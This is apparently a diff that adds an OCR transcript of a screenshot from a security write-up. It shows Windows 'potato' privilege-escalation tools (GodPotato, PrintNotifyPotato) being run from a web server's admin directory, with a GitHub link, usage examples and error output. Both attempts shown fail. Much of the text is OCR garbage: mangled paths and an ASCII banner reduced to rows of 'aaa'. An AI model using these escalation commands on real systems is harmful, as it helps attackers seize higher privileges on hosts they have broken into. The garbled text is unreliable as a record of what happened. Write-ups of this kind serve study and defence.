@@ -1,0 +1,32 @@
+# OCR: 2ece113555e979a8e6533975063cfeea.jpg
+# 来源: .\02-WriteUp\2024\2ece113555e979a8e6533975063cfeea.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:25
+
+C:/Server!WebSits/admin/ >GodPotato.exe -cmd "cmd fc whoami"
+[1] No combase module found
+C:/ServeriWebSits/admin! =P exe
+aaa aaa aaa
+aaa aaa aaa
+aaaa aaa aaa
+aaa aaa aaa
+aaaa aaa aaa
+aaaa aaa aaa
+aaa aaa aaaaaaa aaaaaaa aaa aaa
+aaaaaaaaaaa aaaaaaaaa aaacadaaa aaa aaa
+aaaaaaaaaaa aaaa aaa aaaa aaaa aaa aaaa
+an aaa aaa aaa aaaa aaaaaaa
+aaa aaa aaaaaaa aaa © aaaaaaa
+aaa aaa aaaaaaaaa aaa © aaaaaaaa
+aaa aaa gaa aaa aaa aaa aaaa aaa
+aaaa aaa aga aaaa aaaa aaa aaa aaa
+aaaa aaa asa aaaga aaaa aaaa ada aaaa
+aaa aaa asaaaaaeaa aaacadaa aaa aaa
+aaa aaa aaaaaaaa aaaaa aaa aaaa
+Github: https:/github.com/BeichenDream/PrintNotityPotato
+Example
+PrintNotifyPotato.exe whoami
+PrintNotifyPotato.exe cmd interactive
+C:!Server/WebSits/admin/ >P.exe whoami
+{!] Cannot Createinstance PrintNotify hr = -2147221164
+C:/ServeriWebSits/admin/ >
